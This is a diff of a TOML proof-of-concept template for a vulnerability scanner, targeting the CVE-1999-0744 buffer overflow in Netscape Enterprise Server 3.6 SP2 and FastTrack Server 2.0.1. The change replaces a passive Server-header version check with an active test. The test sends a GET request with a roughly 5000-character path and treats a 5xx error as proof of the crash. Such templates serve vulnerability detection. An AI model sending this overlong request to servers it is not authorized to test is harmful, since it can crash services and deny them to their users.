@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "检测目标是否为受影响的 Netscape Enterprise Server 3.6 SP2/4.0 或 FastTrack Server 2.0.1，通过 Server 响应头识别版本。该版本存在远程缓冲区溢出漏洞(CVE-1999-0744)，发送超长 HTTP GET 请求(>4080字符)可触发服务崩溃甚至任意代码执行。"
+description = "检测 Netscape Enterprise Server 3.6 SP2 / FastTrack Server 2.0.1 缓冲区溢出漏洞，发送超长 HTTP GET 请求触发缓冲区溢出导致拒绝服务"
 id = "POC-AVE-1999-0365"
-name = "Netscape Enterprise Server Remote Buffer Overflow PoC"
+name = "CVE-1999-0744 PoC"
 severity = "high"
 tags = ["ave-1999-0365"]
 vuln_id = [
@@ -11,18 +11,31 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/"
+path = "/{{rand_str_5000}}"
 protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
 
 [[poc.requests.matchers]]
 expect = true
 part = "header"
 type = "word"
 words = [
-    "Netscape-Enterprise",
-    "Netscape-FastTrack",
+    "Server: Netscape-Enterprise",
+    "Server: Netscape-FastTrack",
 ]
